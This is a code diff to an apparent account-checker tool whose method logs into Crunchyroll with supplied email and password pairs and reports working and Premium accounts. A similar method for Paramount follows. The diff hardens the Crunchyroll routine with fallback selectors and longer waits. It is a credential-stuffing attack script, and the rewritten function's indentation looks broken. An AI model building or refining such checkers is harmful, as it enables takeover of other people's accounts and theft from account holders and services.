@@ -219,33 +219,68 @@ class BrowserChecker:
             await browser.close()
             await playwright.stop()
 
-    async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
-        playwright, browser, page = await self._init_browser()
-        try:
-            await page.goto("https://www.crunchyroll.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(2000)
-
-            await page.fill('input[name="email"]', email)
-            await page.fill('input[name="password"]', password)
-            await page.click('button[type="submit"]')
-            await page.wait_for_timeout(5000)
-
-            if "home" in page.url:
-                await page.goto("https://www.crunchyroll.com/premium")
-                page_content = await page.content()
-                if "Premium" in page_content:
-                    return True, "Crunchyroll Premium active"
-                return True, "Free Crunchyroll account"
-            elif "error" in page.url.lower():
-                return False, "Invalid credentials"
-
-            return False, "Login failed"
-        except Exception as e:
-            logger.error(f"Crunchyroll check error: {e}")
-            return False, f"Error: {str(e)[:50]}"
-        finally:
-            await browser.close()
-            await playwright.stop()
+   async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
+    playwright, browser, page = await self._init_browser()
+    try:
+        # Increase timeout to 60 seconds
+        await page.goto("https://www.crunchyroll.com/login", timeout=60000)
+        await page.wait_for_timeout(5000)
+        
+        # Try multiple selectors for email
+        email_selectors = ['input[name="email"]', 'input[type="email"]', '#login-form-email']
+        for selector in email_selectors:
+            try:
+                if await page.locator(selector).count():
+                    await page.fill(selector, email)
+                    break
+            except:
+                continue
+        
+        # Try multiple selectors for password
+        password_selectors = ['input[name="password"]', 'input[type="password"]', '#login-form-password']
+        for selector in password_selectors:
+            try:
+                if await page.locator(selector).count():
+                    await page.fill(selector, password)
+                    break
+            except:
+                continue
+        
+        # Wait and click login
+        await page.wait_for_timeout(2000)
+        
+        button_selectors = ['button[type="submit"]', 'input[type="submit"]', '.login-button']
+        for selector in button_selectors:
+            try:
+                if await page.locator(selector).count():
+                    await page.click(selector)
+                    break
+            except:
+                continue
+        
+        # Wait longer for redirect (10 seconds)
+        await page.wait_for_timeout(10000)
+        
+        # Check if login successful
+        if "home" in page.url or "profile" in page.url:
+            # Check for premium
+            await page.goto("https://www.crunchyroll.com/premium")
+            await page.wait_for_timeout(3000)
+            page_content = await page.content()
+            if "Premium" in page_content or "Mega Fan" in page_content:
+                return True, "Crunchyroll Premium active"
+            return True, "Free Crunchyroll account"
+        elif "error" in page.url.lower() or "invalid" in (await page.content()).lower():
+            return False, "Invalid credentials"
+        
+        return False, "Login failed"
+        
+    except Exception as e:
+        logger.error(f"Crunchyroll check error: {e}")
+        return False, f"Error: {str(e)[:50]}"
+    finally:
+        await browser.close()
+        await playwright.stop()
 
     async def check_paramount(self, email: str, password: str) -> Tuple[bool, str]:
         playwright, browser, page = await self._init_browser()
